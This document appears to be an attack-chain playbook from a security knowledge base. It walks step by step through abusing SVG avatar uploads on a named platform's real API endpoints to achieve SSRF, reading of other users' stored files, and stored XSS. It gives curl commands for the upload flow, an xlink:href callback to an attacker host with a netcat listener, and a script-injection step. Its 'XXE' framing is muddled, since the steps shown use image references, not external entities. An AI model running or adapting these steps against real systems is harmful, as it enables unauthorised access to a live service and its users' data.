# SVG Avatar Upload Leading to XXE Exploitation for SSRF, LFI, and Stored XSS

Multi-stage attack chain demonstrating exploitation of an avatar upload feature that accepts SVG files without validation, enabling XML External Entity (XXE) injection for Server-Side Request Forgery (SSRF), Local File Inclusion (LFI), Stored Cross-Site Scripting (XSS), and potential Denial of Service (DoS) via XML entity expansion.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 6 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Request Pre-Signed URL] --> B[Notify API of Upload]
    B --> C[Upload Malicious SVG]
    C --> D[Exploit XXE for SSRF]
    D --> E[Exploit XXE for LFI]
    E --> F[Exploit Stored XSS]
    F --> G[Potential DoS Extension]

    style A fill:#e74c3c
    style B fill:#e74c3c
    style C fill:#f39c12
    style D fill:#f39c12
    style E fill:#3498db
    style F fill:#3498db
    style G fill:#27ae60
```



## Prerequisites & Requirements

### Required Tools

- [[tools/netcat]]
- HTTP client (e.g., curl or Burp Suite for requests)

### Target Environment

- Web application with avatar upload feature using S3 for storage
- AWS S3 bucket accessible via pre-signed URLs
- Server-side SVG rendering/processing

### Initial Access Requirements

- Valid user account on the target platform (e.g., TopCoder API access)
- Network access to API endpoints (https://api.topcoder.com/v3)
- Ability to create additional test accounts for LFI testing

## Detailed Attack Procedures

### Step 1: Request Pre-Signed S3 URL
procedure: [[procedures/Request-Pre-Signed-S3-URL-for-SVG]]

**Objective**: Obtain a pre-signed S3 upload URL for an SVG file by specifying image/svg+xml MIME type.

**Instructions**: Send a POST request to the photo upload URL endpoint with the contentType parameter set to image/svg+xml. The response provides the preSignedURL and a token for filename.

```bash
curl -X POST https://api.topcoder.com/v3/members/oldsoul/photoUploadUrl \
  -H "Content-Type: application/json" \
  -d '{"contentType": "image/svg+xml"}'
```

**Expected Output**: JSON response with preSignedURL (S3 URL) and token (e.g., random number for filename).

**Success Indicators**:
- Pre-signed URL received
- Token extracted for next steps

### Step 2: Notify API of Upload
procedure: [[procedures/Notify-API-of-SVG-Upload]]

**Objective**: Register the upcoming SVG upload with the API using the token.

**Instructions**: Send a PUT request to the photo endpoint with the token and contentType.

```bash
curl -X PUT https://api.topcoder.com/v3/members/oldsoul/photo \
  -H "Content-Type: application/json" \
  -d '{"token": "extracted_token", "contentType": "image/svg+xml"}'
```

**Expected Output**: Success response confirming upload registration.

**Success Indicators**:
- API acknowledges the upload
- No validation errors on MIME type

### Step 3: Upload Malicious SVG
procedure: [[procedures/Upload-Malicious-SVG-to-S3]]

**Objective**: Upload the SVG containing XXE payload to the S3 bucket via pre-signed URL.

**Instructions**: Use PUT to the preSignedURL with the malicious SVG XML in the body.

```bash
curl -X PUT "$preSignedURL" \
  -H "Content-Type: image/svg+xml" \
  --data '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg xmlns="http://www.w3.org/2000/svg" version="1.1"></svg>'
```
(Replace with actual malicious payload for specific exploits.)

**Expected Output**: HTTP 200 OK from S3.

**Success Indicators**:
- File uploaded successfully
- SVG accessible in user profile

### Step 4: Exploit XXE for SSRF
procedure: [[procedures/Exploit-XXE-for-SSRF-via-External-Resource-Fetch]]

**Objective**: Trigger server to fetch external attacker-controlled resource via XXE in SVG.

**Instructions**: Modify SVG with <image xlink:href="http://attacker-ip:81/test" /> and re-upload. Start listener with [[commands/nc-listen-for-ssrf]] before triggering render.

**Expected Output**: Server request hits listener.

**Success Indicators**:
- Incoming connection on listener port
- SSRF confirmed by fetched resource

### Step 5: Exploit XXE for LFI
procedure: [[procedures/Exploit-XXE-for-LFI-on-S3-Bucket-Files]]

**Objective**: Read local S3 files (e.g., other avatars) via XXE path traversal.

**Instructions**: Create test user, upload normal image, then use SVG with <image xlink:href="/member/profile/testuser-timestamp.png" /> and trigger render.

**Expected Output**: Image content fetched and potentially exfiltrated.

**Success Indicators**:
- Other user's file content accessible
- LFI limited to bucket images confirmed

### Step 6: Exploit Stored XSS
procedure: [[procedures/Exploit-Stored-XSS-via-SVG-JavaScript-Injection]]

**Objective**: Inject and execute JavaScript in SVG for persistent XSS on avatar render.

**Instructions**: Embed <script>alert(1)</script> in SVG XML and upload. View profile in browser to trigger.

**Expected Output**: Alert box or script execution on render.

**Success Indicators**:
- JavaScript executes in viewer browser
- Potential for session theft or phishing

## Attack Chain Summary

### Key Achievements

1. Bypassed file upload validation to inject XXE payloads
2. Achieved SSRF for external resource access and LFI on S3 files
3. Enabled stored XSS for client-side execution and potential DoS via entity expansion

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[File and Directory Discovery]] File and Directory Discovery
- [[Drive-by Compromise]] Drive-by Compromise
- [[Endpoint Denial of Service]] Endpoint Denial of Service

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Discovery]] Discovery
- [[Execution]] Execution

---
*Last updated: 2023-10-01T00:00:00Z*
